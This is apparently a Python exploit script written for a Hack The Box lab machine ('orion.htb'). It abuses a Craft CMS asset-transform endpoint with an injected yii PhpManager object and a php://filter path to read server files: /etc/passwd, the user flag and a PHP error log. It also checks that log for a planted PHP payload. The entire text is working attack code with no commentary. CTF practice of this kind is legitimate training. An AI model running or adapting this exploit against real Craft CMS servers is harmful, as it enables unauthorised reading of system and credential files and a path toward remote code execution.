import requests, re, time

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def try_read(filepath, label):
    time.sleep(1)
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        print(f'  [{label}] No CSRF')
        return None
    csrf = m.group(1)

    # Use php://filter to base64-encode the file, then require passes it through raw
    filter_path = f'php://filter/read=convert.base64-encode/resource={filepath}'
    
    body = {
        'assetId': 11,
        'handle': {
            'width': 1, 'height': 1,
            'as session': {
                'class': 'yii\\rbac\\PhpManager',
                'itemFile': filter_path
            }
        }
    }
    headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=30)
    
    print(f'  [{label}] {r2.status_code}, {len(r2.text)} bytes', flush=True)
    return r2.text

# Try reading a known file first
print('[*] Reading /etc/passwd...', flush=True)
text = try_read('/etc/passwd', 'passwd')
if text:
    # Search for base64 output (valid base64 strings)
    import base64
    for line in text.split('\n'):
        line = line.strip()
        # Base64 is typically longer strings with A-Za-z0-9+/= ends
        if len(line) > 30 and line.endswith('='):
            try:
                decoded = base64.b64decode(line).decode('utf-8', errors='replace')
                if 'root:' in decoded or 'www-data' in decoded or 'adam' in decoded:
                    print(f'\n[+] DECODED /etc/passwd:')
                    print(decoded[:500])
                    break
            except Exception:
                pass

# Try reading the user flag directly
print('\n[*] Reading /home/adam/user.txt...', flush=True)
text2 = try_read('/home/adam/user.txt', 'user.txt')
if text2:
    print(f'  Response snippet: {text2[:500]}')
    import base64
    for line in text2.split('\n'):
        line = line.strip()
        if len(line) > 5 and not line.startswith('<'):
            try:
                decoded = base64.b64decode(line).decode('utf-8', errors='replace')
                if 'HTB{' in decoded or len(decoded) > 5:
                    print(f'\n[+] DECODED user.txt: {decoded}')
            except Exception:
                pass

# Try reading error_log
print('\n[*] Reading error_log...', flush=True)
text3 = try_read('/var/www/html/craft/storage/logs/phperrors.log', 'error_log')
if text3:
    print(f'  Response first 500: {text3[:500]}')
    print(f'  Response last 500: {text3[-500:]}')
    # Search for our inject payload
    if '<?php' in text3 or 'file_put_contents' in text3:
        print('  [+] PAYLOAD FOUND IN ERROR LOG!')
    # Also look for any base64 in response
    for line in text3.split('\n'):
        line = line.strip()
        if len(line) > 10 and line.endswith('='):
            try:
                decoded = __import__('base64').b64decode(line).decode('utf-8', errors='replace')
                if 'require(' in decoded or 'PHP' in decoded or len(decoded) > 50:
                    print(f'  Base64 decode: {decoded[:200]}')
            except Exception:
                pass
